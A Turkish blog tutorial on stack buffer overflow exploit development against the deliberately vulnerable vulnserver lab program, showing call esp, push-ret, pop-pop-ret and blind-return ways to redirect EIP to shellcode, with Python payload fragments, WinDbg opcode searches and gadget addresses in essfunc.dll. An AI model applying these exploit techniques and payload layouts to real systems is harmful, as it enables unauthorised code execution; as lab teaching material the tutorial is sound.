---
layout: post
title: Shellcode'a Atlamak
---

Basite indirgenirse bulduğunuz bir zafiyet için bir exploit yazarken yapmaya çalıştığınız şey shellcodenuzu **EIP** registeri aracılığıyla işlemek. 

Bunu yapmanın farklı yöntemleri var, efendim genellikle browser zafiyetlerinde heap spray, normal * overflow açıklarında `jmp esp, call esp, push return, pop return` etc... kullanarak shellcodu *CPU* tarafından işliyorsunuz. Bundan önceki makalede bir `jmp esp` instructionını **EIP** üzerine yazarak stackde bulunan shellcodea atlamıştık. Bu makalede bunun diğer yöntemlerinden bahsetmeye çalışacağım. Makalede önceki yazıda kullandığımız düzenlenmiş *vulnserver* programını kullanmaya devam edicem, siz dilerseniz başka bir program kullanabilirsiniz.

## call [register] Metodu
Bu metodu herhangi bir register bizim shellcodumuzun başlangıç adresi ile dolu olduğunda kullanabiliyoruz. Önceki makalede exploit ettiğimiz overflow açığının exploiti üzerinde düzenleme yaparak nasıl olduğunu görelim. Öncelikle yapmamız gereken şey diğer yazıda olduğu gibi bir `call [reg]` instructionı bulmak. Bunun için vulnserver programımızı Olly'de açıyoruz. Ardından **ALT + E** kısayolu ile çalıştırılabilir moduller içerisinden programın kullandığı *essfunc.dll*'ye çift tıklayıp içerisinde girdikten sonra **CTRL + F** ile `call esp` araması yapıyoruz.

![](/files/callesp.png)

Gördüğünüz üzere `0x62501203` adresinde call esp instructionu mevcut. Resimde ayrıca bu işlemi hızlıca yapmanın bir yolu olan **findjmp** isimli uygulamanın çıktısını da görüyorsunuz. Bu adresi alıp önceki makalede bulunan exploitde gerekli yere yazıyoruz. Şu şekilde oluyor son hali:

    skip---
    mesaj += "A" * 2006
    mesaj += struct.pack('<I', 0x62501203) # essfunc.dll call esp (EIP)
    mesaj += "\x90" * 20
    skip---

Exploiti çalıştırdıktan sonra *vulnserver* uygulamasının çalıştığı sistemde shellcodumuz çalışacak ve *Gari de Gari* penceresi açılacaktır.

## push return Metodu
Bu metod önceki metodla benzerdir. Örneğin shellcodunuz yine espde olsun fakat bir engelden dolayı `call esp` yahut `jmp esp` yapamıyorsunuz. İşte bu durumda yapmanız gereken şey bir adet `push esp` ve bir adet `ret` instructionı kullanmak. Bunun için yine hafızada bu iki makine komutunu bulup exploitimizi ona göre düzenleyeceğiz. Ben bu defa *windbg* kullacağım daha fazla bilgi vermek için. Programı çalıştırıp windbg ile incelemeye aldıktan sonra *Debug* menüsünden *Break*'i seçerek kontrolu devralıyorum. Ardından `lm` komutuyla yüklenen modülleri listeliyorum.

    0:001> lm
    start    end        module name
    00400000 00407000   image00400000   (deferred)
    62500000 62508000   essfunc    (deferred)  
    629c0000 629c9000   LPK        (deferred)    
    662b0000 66308000   hnetcfg    (deferred)      
    71a50000 71a8f000   mswsock    (deferred)

essfunc.dll `62500000` ile `62508000` arasındaymış. Şimdi bu iki adres arasında arama yaparak `push esp ret` bulacağız. Öncelikle bu iki instructionın makine kodlarını öğrenelim.

    0:001> a
    7c901210 push esp
    push esp
    7c901211 ret
    ret
    7c901212 

    0:001> u 7c901210
    ntdll!DbgBreakPoint+0x2:
    7c901210 54              push    esp
    7c901211 c3              ret

**54** ve **c3** bizim opcode değerlerimiz. Şimdi bu değerleri bizim dll dosyamız içerisinde aratalım.

    0:000> s 62500000 62508000 54 c3
    625011df  54 c3 ff e2 59 5a c3 5d-c3 55 89 e5 ff e4 ff e6  T...YZ.].U......

`625011df` adresi bize gereken adres. Şimdi exploiti yeni adrese göre düzenleyip çalıştıralım.

    skip---
    mesaj += "A" * 2006 
    mesaj += struct.pack('<I', 0x625011df) # essfunc.dll push esp, ret (EIP)
    mesaj += "\x90" * 20
    skip---

Doğrulamak adına kısa bir inceleme yapalım. Windbg üzerinde `625011df` adresine `bp` komutu ile breakpoint koyuyorum. Ardından exploiti çalıştırıp 2-3 step inceliyorum.

![](/files/pushreturnmetodu.png)

Resimde kısa bir analizi görüyorsunuz. push esp ret bulunan adres **EIP** registerına yazılmış, program ordan devam ederken önce `push esp` ile `0xbdfa0c` yığına gönderiliyor, ardından `ret` ile yığından bu değer alınıp oradan devam ediliyor. Buradan sonra `g` ile programı devam ettirirsek exploit çalışacaktır.

## pop return Metodu
Eğer yığında shellcodea gidecek başka bir instruction varsa o zaman bu metot kullanılır. Bu gibi durumlarda yığının durumu şuna benzer bir şekilde oluyor:

    [AAAAAAAAAAA...AA][0x625011eb][NOOOOOOOOOPLAR[0x625011af][Shellcode]
       JUNK        EIP(pop ret)    8 byte NOP       jmp esp    Shellcode
         
`pop pop ret` **SEH** exploit ederken de karşımıza çıkacak fakat buradaki durum onla alakalı değil. Buradaki mantık şu:

    0:001> dd esp
    00bdfa0c  90909090 90909090 625011af 90909090
    00bdfa1c  90909090 90909090 90909090 90909090
    00bdfa2c  6fe79aba d9c2db9a 5ef42474 44b1c931
    00bdfa3c  31fcee83 56031056 b6127810 3d04e771

Burada stack durumunu görüyorsunuz. `625011af` ESP'ye **jmp** yapan bir instructionı gösteriyor. Fakat bunun çağırılması için öncelikle ondan öncekilerin ortadan kalkması lazım. Bunları stackten yok etmek için iki adet **pop** yeterli olacak bizim için, ardından bir **ret** kullanarak stackteki adresi alıp oradan yürütmeye devam edeceğiz programı.

    0:001> a
    00bdfa18 pop eax
    pop eax
    00bdfa19 pop ebx
    pop ebx
    00bdfa1a ret
    ret
    00bdfa1b 

    0:001> u 00bdfa18
    00bdfa18 58              pop     eax
    00bdfa19 5b              pop     ebx
    00bdfa1a c3              ret

Önce makine kodunu öğrendik, şimdi hafızada aratalım.

    0:001> s 62500000 62508000 58 5b c3
    625011eb  58 5b c3 e6 59 58 c3 5d-c3 55 89 e5 ff e4 ff e5  X[..YX.].U......

Aradığımız `625011eb` adresindeymiş. Şimdi gerekli düzenlemeleri yapalım. Exploitin son hali şu şekilde:

    skip---
    mesaj += struct.pack('<I', 0x625011eb) # pop pop ret (EIP)
    mesaj += "\x90" * 8 # Arada kalan 8 bytelık NOP
    mesaj += struct.pack('<I', 0x625011AF)  # jmp esp
    skip---

## Blind Return (Kör Dönüş) Metodu
Bu yöntemi uygulamak için yapmamız gereken öncelikle EIP'i 'ret' komutunu gösteren bir adres ile yazmak, ardından shellcodemuzun adresini elle belirleyip stackin ilk 4 byteına yazmak. Bunları gerçekleştirince EIP yazdığımız adrese geldiği zaman, yani ret çalıştığı zaman stackten el ile belirleyip yazdığımız shellcodenun adresini alarak programın akışını oradan devam ettirecek böylece shellcode çalışmış olacak.

Bu metod örneğin EIP'i bir yazmaca gidecek şekilde ayarlayamadığınızda, yani, jmp veya call instructionlarını kullanamadığınızda fakat stackte kontrolunuz olduğu durumlarda kullanabilirsiniz. Çok sık rastlanılmasa da karşı karşıya kalınabilecek durumlardan biri de bu. Tabi bu yöntemi uygularken de nullbyte kullanmamaya dikkat etmeniz gerekiyor. Aksi halde bulduğunuz ret adresi nullbyte içerdiği zaman, bu sonlandırıcı olarak algılanacağı için stacke istediğiniz gibi yazma yapamayacaksınız. Basitçe bu yöntemi kullanırkenki stack görüntünüz şöyle bir şey oluyor.

                            ret stackteki ilk 4 byteı
                            alıp, oradan devam edecek
                           -------------------------       ------------
                           |                       |       |          |
	[AAAAAAAAAAA...AA][bulduğunuz ret adresi]    [0xXXXXXXXX]     [Shellcode]
	       JUNK                                ESP(Shellcode adresi)

Sevgiler..
